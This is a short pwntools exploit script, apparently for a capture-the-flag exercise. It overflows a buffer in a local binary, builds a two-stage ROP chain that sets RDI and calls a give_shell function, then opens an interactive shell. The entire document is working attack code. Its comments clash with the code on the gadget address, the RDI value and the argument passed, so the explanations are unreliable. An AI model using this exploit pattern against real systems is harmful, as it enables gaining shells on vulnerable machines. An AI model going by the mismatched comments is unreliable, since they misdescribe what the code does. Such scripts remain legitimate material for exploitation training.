from pwn import *

r = process("./example")

context.log_level = "DEBUG"

# ROP chain construction

# padding for reaching the return address
padding = ("a" * 16) + ("a" * 8)

# Set RDI: jump to 0x4005ee (helper) and place two values on the stack that it will consume:
#    0, to fill RSI (we don't care about its value)
#    0x601040, to fill RDI: a pointer to "/bin/sh"
#          (helper)     (rsi=0)  (rdi=0x31337)
stage1 = p64(0x4005b9) + p64(0) + p64(0x31337)

# Call give_shell; because rdi = 0x31337, we are effectively calling give_shell(0x1337)
stage2 = p64(0x400577)

r.sendline(padding + stage1 + stage2)

r.interactive()
